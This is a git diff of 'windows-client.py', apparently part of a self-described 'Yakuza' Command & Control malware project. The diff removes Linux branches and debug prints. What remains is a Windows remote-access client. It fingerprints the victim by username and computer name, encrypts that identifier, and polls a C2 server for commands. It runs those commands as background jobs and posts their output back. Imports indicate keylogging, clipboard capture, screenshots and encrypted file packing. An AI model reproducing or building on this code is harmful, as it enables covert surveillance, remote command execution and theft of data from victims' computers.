@@ -1,19 +1,12 @@
+""" windows-client.py -
+Yakuza Command & Control (C2) Windows client codes
+Author: Davood Yahay(D. Yakuza)
+Last Update: 10 oct 2024, 16 mehr 1403
 """
-Command & Control Client Side Coding
-Author: Davood Yahay(D.Yakuza)
-"""
-# Import os methods based on OS, use platform.system() to detect OS
-from platform import system
 
-if system() == "Windows":
-    from os import getenv, chdir, path, getcwd
-elif system() == "Linux":
-    from os import getenv, uname, chdir, path, getcwd
-# Import for Windows Builds Only
-from rotatescreen import get_displays
 
-# Import for both Linux & Windows Builds
 from requests import get, exceptions, post, put
+from os import getenv, chdir, path, getcwd
 from colorama import Fore
 from time import time, sleep
 from subprocess import run, PIPE, STDOUT, Popen
@@ -21,6 +14,7 @@ from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from pyperclip import paste, PyperclipWindowsException
 from pynput.keyboard import Listener, Controller, Key
 from PIL import ImageGrab, Image
+from rotatescreen import get_displays
 from winsound import PlaySound, SND_ASYNC
 from multiprocessing import Process
 
@@ -100,21 +94,10 @@ if __name__ == "__main__":
     # jobCount used to count background jobs
     jobCount = 0
 
-    # If Client have Windows OS
-    if system() == "Windows":
-        # For Windows obtain a unique identifying Information
-        client = (getenv("USERNAME", "Unknown-Username") + "@" +
+    # For Windows obtain a unique identifying Information
+    client = (getenv("USERNAME", "Unknown-Username") + "@" +
                   getenv("COMPUTERNAME", "Unknown-Computer Name") + "@" + str(time()))
-
-    # Elif Client have Linux OS
-    elif system() == "Linux":
-        # For Linux, get a unique identifying Information
-        client = getenv("LOGNAME", "Unknown-Username") + "@" + uname().nodename + "@" + str(time())
-
-    # If OS is not windows or linux, use a Linux version of the client
-    else:
-        client = getenv("LOGNAME", "Unknown-Username") + "@" + uname().nodename + "@" + str(time())
-
+    # UTF-8 encode the client first to be able be encrypting it, but then we need string, so decode it at the end
     encryptedClient = cipher.encrypt(client.encode()).decode()
 
     # clientPrint used for print only username@machine from client variable
@@ -126,9 +109,6 @@ if __name__ == "__main__":
         '''Try an http get requests to the C2 Server and retrieve command;
         if failed, Keep Trying forever.'''
         try:
-            # test print
-            print("__name__:", __name__)
-
             response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encryptedClient}", headers=HEADERS, proxies=PROXY)
             # print(f"{Fore.LIGHTYELLOW_EX}{client.split("@")[0]}{Fore.MAGENTA} => {Fore.LIGHTBLUE_EX}{response.status_code}{Fore.RESET}")
             print(client.split("@")[0], "=>", response.status_code, sep=" ")
@@ -208,10 +188,6 @@ if __name__ == "__main__":
                 # Start a background job using a Multiprocessing process for the command that we entered
                 jobs.append(Process(target=run_job, args=(command, jobCount+1)))
                 jobs[jobCount].start()
-
-                # Test printt
-                print("jobs list:", jobs)
-                print("jobs count:", jobCount)
 
                 # give run_job function time to post status to our c2 server, before a new command get request happens
                 sleep(1)
@@ -352,7 +328,6 @@ if __name__ == "__main__":
 
         # the client Kill Command shutdown our malware
         elif command == "client kill":
-            post_to_server(f"{client} has been Killed. \n")
             exit()
 
         # the 'client delay SECOND' command will Change delay time between Inactive Re-Connection attempts
@@ -461,11 +436,9 @@ if __name__ == "__main__":
                     image.show()
                     post_to_server(f"[+]-Client => {filepath} is now Displaying on the {clientPrint}. \n")
                 except OSError as e:
-                    # test print
-                    #print(e, "\n")
-                    if "cannot identify image".lower() in str(e).lower():
+                    if "cannot identify image" in str(e).lower():
                         post_to_server(f"[!]-Client => {filepath} is not an image. \n")
-                    elif "No such file".lower() in str(e).lower():
+                    elif "no such file" in str(e).lower():
                         post_to_server(f"[!]-Client => {filepath} is not Found on the {clientPrint}. \n")
                     else:
                         post_to_server(f"[!]-Client => Unable to Display {filepath} on the {clientPrint}. \n")
